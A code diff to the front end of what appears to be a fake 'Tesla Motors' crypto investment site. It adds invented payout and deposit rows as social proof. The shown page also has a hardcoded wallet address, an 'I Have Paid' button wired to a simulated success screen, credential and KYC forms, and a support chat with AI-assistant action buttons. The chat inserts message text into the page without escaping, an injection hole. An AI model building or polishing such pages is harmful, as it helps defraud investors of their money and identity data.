@@ -287,6 +287,39 @@
             cursor: pointer;
         }
 
+        .chat-action-buttons {
+            display: flex;
+            gap: 6px;
+            margin-top: 8px;
+        }
+
+        .chat-action-btn-yes {
+            background: var(--accent);
+            color: #000;
+            border: none;
+            padding: 6px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 11px;
+            transition: opacity 0.2s;
+        }
+
+        .chat-action-btn-human {
+            background: #1e293b;
+            color: #fff;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 6px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 11px;
+            transition: background 0.2s;
+        }
+
+        .chat-action-btn-yes:hover, .chat-action-btn-human:hover {
+            opacity: 0.85;
+        }
+
         .file-upload-btn {
             background: transparent;
             border: none;
@@ -371,6 +404,8 @@
 
     <!-- USER DASHBOARD SECTION -->
     <section class="user-dashboard" id="userDashboard">
+        
+        <!-- Main Dashboard View -->
         <div id="dashboardOverview">
             <div class="dashboard-header">
                 <div class="dashboard-user-info">
@@ -434,6 +469,7 @@
             </div>
         </div>
 
+        <!-- View: KYC Verification -->
         <div id="kycView" style="display: none; max-width: 600px; margin: 0 auto;">
             <div class="dash-card" style="padding: 30px;">
                 <h2 style="font-size: 24px; color: #fff; margin-bottom: 10px; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 10px;">Identity Verification (KYC)</h2>
@@ -467,6 +503,7 @@
             </div>
         </div>
 
+        <!-- View: Profile Settings -->
         <div id="profileView" style="display: none; max-width: 600px; margin: 0 auto;">
             <div class="dash-card" style="padding: 30px;">
                 <h2 style="font-size: 24px; color: #fff; margin-bottom: 25px; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 10px;">Personal Details</h2>
@@ -501,7 +538,7 @@
         </div>
     </section>
 
-    <!-- MAIN CONTENT -->
+    <!-- MAIN CONTENT (Landing) -->
     <div id="mainPageContent">
         <section class="hero">
             <h1>Capital of the Future.<br>Investing in <span>Tesla Motors</span></h1>
@@ -585,6 +622,20 @@
                             <td>USDT TRC20 (TJ9v...aS5dF)</td>
                             <td style="color: var(--accent); font-weight: 600;">Completed</td>
                         </tr>
+                        <tr>
+                            <td><span class="badge-payout">PAYOUT</span></td>
+                            <td>crypto***king</td>
+                            <td style="font-weight: 600;">$180</td>
+                            <td>Bitcoin (1A1z...fNa)</td>
+                            <td style="color: var(--accent); font-weight: 600;">Sent</td>
+                        </tr>
+                        <tr>
+                            <td><span class="badge-deposit">DEPOSIT</span></td>
+                            <td>invest***77</td>
+                            <td style="font-weight: 600;">$90</td>
+                            <td>Bank Card (4276***)</td>
+                            <td style="color: var(--accent); font-weight: 600;">Completed</td>
+                        </tr>
                     </tbody>
                 </table>
             </div>
@@ -592,6 +643,7 @@
 
         <div class="container" id="plansContainer">
             <h2 class="section-title">Investment Plans</h2>
+            
             <div class="plans-grid">
                 <div class="plan-card">
                     <h3 class="plan-title">Novice</h3>
@@ -656,10 +708,13 @@
     <!-- Modal Window -->
     <div class="modal-overlay" id="paymentModal">
         <div class="modal">
+            <!-- Auth Window -->
             <div id="authContainer" style="display: none;">
                 <h3 id="authTitle">Sign In to Account</h3>
                 <p id="authDesc">Enter your details to access your dashboard</p>
+
                 <div class="auth-success-badge" id="authSuccessBadge">Success!</div>
+
                 <div class="amount-input-group">
                     <label>Email Address:</label>
                     <input type="email" id="authEmail" placeholder="name@example.com">
@@ -668,20 +723,25 @@
                     <label>Password:</label>
                     <input type="password" id="authPassword" placeholder="••••••••">
                 </div>
+
                 <div class="auth-actions-row">
                     <button class="btn" id="authSubmitBtn" onclick="submitAuth()">Sign In</button>
                     <div class="auth-error-badge" id="authErrorBadge">Data Error</div>
                 </div>
+
                 <button class="close-btn" onclick="closeModal()">Close</button>
             </div>
 
+            <!-- Step 1: Amount Input & Method Selection -->
             <div id="stepSelection">
                 <h3 id="modalTitle">Investment</h3>
                 <p id="modalDesc">Enter amount and select payment method</p>
+                
                 <div class="amount-input-group">
                     <label for="investAmount">Investment Amount ($):</label>
                     <input type="number" id="investAmount" min="10" max="10000" oninput="validateAmount()">
                 </div>
+
                 <div class="payment-methods">
                     <button class="pay-btn" onclick="proceedToCheckout('USDT')">Cryptocurrency USDT (TRC20)</button>
                     <button class="pay-btn" onclick="proceedToCheckout('BTC')">Cryptocurrency Bitcoin (BTC)</button>
@@ -691,13 +751,16 @@
                 <button class="close-btn" onclick="closeModal()">Cancel</button>
             </div>
 
+            <!-- Withdrawal Window -->
             <div id="stepWithdraw" style="display: none;">
                 <h3>Withdrawal</h3>
                 <p>Minimum withdrawal amount: $10</p>
+                
                 <div class="amount-input-group">
                     <label>Account Number / Wallet:</label>
                     <input type="text" id="withdrawDestination" placeholder="Enter details">
                 </div>
+
                 <div class="amount-input-group">
                     <label>Payment System:</label>
                     <select id="withdrawSystem">
@@ -706,28 +769,35 @@
                         <option value="Bank Card">Bank Card</option>
                     </select>
                 </div>
+
                 <div class="amount-input-group">
                     <label>Withdrawal Amount ($):</label>
                     <input type="number" id="withdrawAmount" min="10" placeholder="10">
                 </div>
+
                 <button class="btn" onclick="submitWithdrawal()">Request Payout</button>
                 <button class="close-btn" onclick="closeModal()">Cancel</button>
             </div>
 
+            <!-- Step 2: Payment Details -->
             <div class="checkout-box" id="stepCheckout">
                 <h3>Deposit Payment</h3>
                 <p>Transfer the exact amount to the specified details:</p>
+                
                 <div class="invoice-details">
                     <p>Plan: <span><span id="checkPlan">Novice</span></span></p>
                     <p>Amount Due: <span><span id="checkAmount" class="hl">$10</span></span></p>
                     <p>Method: <span><span id="checkMethod">USDT</span></span></p>
                 </div>
+
                 <div class="qr-placeholder">SCAN QR<br><span style="font-size: 8px; font-weight: normal; color: #666;">(For mobile payment)</span></div>
                 <div class="wallet-address" id="checkAddress">TJ9v2kX8sL1mN4pQ7wE3rT6yU9iO2aS5dF</div>
+
                 <button class="btn" onclick="simulateSuccess()">I Have Paid</button>
                 <button class="close-btn" onclick="resetModal()">Back to Methods</button>
             </div>
 
+            <!-- Step 3: Success -->
             <div class="success-screen" id="stepSuccess">
                 <div class="success-icon">&#10004;</div>
                 <h3>Deposit Processing!</h3>
@@ -834,7 +904,7 @@
 
         const ADMIN_EMAIL = 'binarpok@gmail.com';
 
-        /* Support Chat Widget Functions (Fixed 404 & Full API support) */
+        /* Support Chat Widget Functions (Real-time + Images + AI Action Buttons) */
         let sessionId = '';
         let displayedChatCount = 0;
         let selectedImageBase64 = null;
@@ -904,7 +974,6 @@
         async function fetchSupportMessages() {
             if (!sessionId) return;
             try {
-                // Поддержка относительного пути
                 let res = await fetch('/api/chat/get?session_id=' + encodeURIComponent(sessionId));
                 if (!res.ok) {
                     res = await fetch('/get?session_id=' + encodeURIComponent(sessionId));
@@ -925,7 +994,7 @@
                         
                         let contentHtml = '';
                         if (item.text) {
-                            contentHtml += `<div>${senderType === 'admin' ? '👨‍💻 Support: ' : ''}${item.text}</div>`;
+                            contentHtml += `<div>${senderType === 'admin' ? '👨‍💻 Support: ' : ''}${item.text.replace(/\n/g, '<br>')}</div>`;
                         } else if (senderType === 'admin') {
                             contentHtml += `<div>👨‍💻 Support:</div>`;
                         }
@@ -935,6 +1004,27 @@
                         }
 
                         div.innerHTML = contentHtml;
+
+                        // Отрисовка кнопок "Да" и "Позвать человека" от ИИ-помощника
+                        if (item.show_buttons) {
+                            const btnBox = document.createElement('div');
+                            btnBox.className = 'chat-action-buttons';
+
+                            const btnYes = document.createElement('button');
+                            btnYes.className = 'chat-action-btn-yes';
+                            btnYes.textContent = 'Да';
+                            btnYes.onclick = () => sendChatAction('solved_yes');
+
+                            const btnHuman = document.createElement('button');
+                            btnHuman.className = 'chat-action-btn-human';
+                            btnHuman.textContent = 'Позвать человека';
+                            btnHuman.onclick = () => sendChatAction('call_human');
+
+                            btnBox.appendChild(btnYes);
+                            btnBox.appendChild(btnHuman);
+                            div.appendChild(btnBox);
+                        }
+
                         container.appendChild(div);
 
                         if (senderType === 'admin') {
@@ -1006,6 +1096,28 @@
                 showCustomAlert('Server connection error', 'Error');
             } finally {
                 sendBtn.disabled = false;
+            }
+        }
+
+        async function sendChatAction(actionType) {
+            if (!sessionId) return;
+            try {
+                let response = await fetch('/api/chat/send', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ session_id: sessionId, action: actionType })
+                });
+
+                if (!response.ok) {
+                    await fetch('/send_message', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ session_id: sessionId, action: actionType })
+                    });
+                }
+                fetchSupportMessages();
+            } catch (e) {
+                console.error("Error sending action:", e);
             }
         }
 
